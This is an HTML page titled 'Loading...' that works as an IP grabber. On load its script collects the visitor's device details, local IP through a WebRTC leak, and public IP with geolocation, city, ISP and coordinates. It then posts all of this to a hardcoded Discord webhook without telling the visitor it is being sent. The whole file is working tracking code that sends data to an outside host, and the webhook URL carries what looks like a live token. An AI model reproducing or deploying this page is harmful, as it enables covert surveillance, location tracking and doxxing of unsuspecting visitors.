<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading...</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      width: 90%;
    }
    .info, .ip-box {
      max-width: 600px;
      background: #222;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #000;
      font-size: 16px;
      color: white;
      margin: 10px;
    }
    .info code, .ip-box code {
      color: #00FF00;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="info" id="visitor-info">
      Loading...
    </div>
    <div class="ip-box" id="ip-info">
      Loading...
    </div>
  </div>

  <script>
    function getLocalIPs(callback) {
      const ips = [];
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then((offer) => pc.setLocalDescription(offer));
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          const candidate = event.candidate.candidate;
          const regex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
          const ipMatch = candidate.match(regex);
          if (ipMatch) {
            ips.push(ipMatch[0]);
          }
        }
      };
      setTimeout(() => {
        callback(ips);
      }, 2000);
    }

    async function sendVisitorData(visitorData) {
      try {
        const webhookURL = 'https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t';
        const discordMessage = {
          content: "New Visitor Info:\n",
          embeds: [
            {
              title: "Visitor Information",
              fields: [
                { name: "üß† Device Info", value: `
                  **User Agent**: ${visitorData.userAgent}
                  **OS Platform**: ${visitorData.platform}
                  **Language**: ${visitorData.language}
                  **Screen Resolution**: ${visitorData.resolution}
                  **CPU Threads**: ${visitorData.cpu}
                  **RAM**: ${visitorData.memory}
                  **Battery**: ${visitorData.battery}
                  **Online Status**: ${visitorData.onlineStatus}
                ` },
                { name: "üåê IP Info", value: `
                  **Public IP**: ${visitorData.ipData.ip}
                  **Local IP**: ${visitorData.localIP}
                  **City**: ${visitorData.ipData.city}
                  **Region**: ${visitorData.ipData.region}
                  **Country**: ${visitorData.ipData.country_name}
                  **Timezone**: ${visitorData.ipData.timezone}
                  **ISP**: ${visitorData.ipData.org}
                  **Latitude**: ${visitorData.ipData.latitude}
                  **Longitude**: ${visitorData.ipData.longitude}
                ` }
              ]
            }
          ]
        };

        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(discordMessage),
        });

        if (response.ok) {
          console.log("Visitor data sent to Discord successfully.");
        } else {
          console.error("Failed to send visitor data to Discord.");
        }
      } catch (error) {
        console.error("Error sending visitor data to Discord:", error);
      }
    }

    async function getVisitorInfo() {
      try {
        const userAgent = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const platform = navigator.platform;
        const resolution = `${screen.width}x${screen.height}`;
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
        const cpu = navigator.hardwareConcurrency || 'N/A';
        const onlineStatus = navigator.onLine ? "Online" : "Offline";
        let battery = 'N/A';

        if (navigator.getBattery) {
          try {
            const batteryInfo = await navigator.getBattery();
            battery = (batteryInfo.level * 100).toFixed(0) + "%";
          } catch (e) {
            battery = "Unavailable";
          }
        }

        getLocalIPs(async (ips) => {
          const localIP = ips.length > 0 ? ips[0] : 'N/A';

          const ipResponse = await fetch('https://ipapi.co/json/');
          const ipData = await ipResponse.json();

          const visitorContent = `
            <strong>üß† Device Info</strong><br>
            ‚Ä¢ User Agent: <code>${userAgent}</code><br>
            ‚Ä¢ OS Platform: ${platform}<br>
            ‚Ä¢ Language: ${language}<br>
            ‚Ä¢ Screen Resolution: ${resolution}<br>
            ‚Ä¢ CPU Threads: ${cpu}<br>
            ‚Ä¢ RAM: ${memory}<br>
            ‚Ä¢ Battery: ${battery}<br>
            ‚Ä¢ Online Status: ${onlineStatus}<br>
          `;
          document.getElementById("visitor-info").innerHTML = visitorContent;

          const ipContent = `
            <strong>üåê IP Info</strong><br>
            ‚Ä¢ Public IP: <code>${ipData.ip}</code><br>
            ‚Ä¢ Local IP: <code>${localIP}</code><br>
            ‚Ä¢ City: ${ipData.city}<br>
            ‚Ä¢ Region: ${ipData.region}<br>
            ‚Ä¢ Country: ${ipData.country_name}<br>
            ‚Ä¢ Timezone: ${ipData.timezone}<br>
            ‚Ä¢ ISP: ${ipData.org}<br>
            ‚Ä¢ Latitude: ${ipData.latitude}<br>
            ‚Ä¢ Longitude: ${ipData.longitude}<br>
          `;
          document.getElementById("ip-info").innerHTML = ipContent;

          const visitorData = {
            userAgent,
            platform,
            language,
            resolution,
            memory,
            cpu,
            onlineStatus,
            battery,
            localIP,
            ipData,
          };

          sendVisitorData(visitorData);
        });

      } catch (err) {
        console.error("Failed to get visitor info:", err);
        document.getElementById("visitor-info").innerText = "Failed to load visitor info.";
        document.getElementById("ip-info").innerText = "Failed to load IP info.";
      }
    }

    getVisitorInfo();
  </script>
</body>
</html>
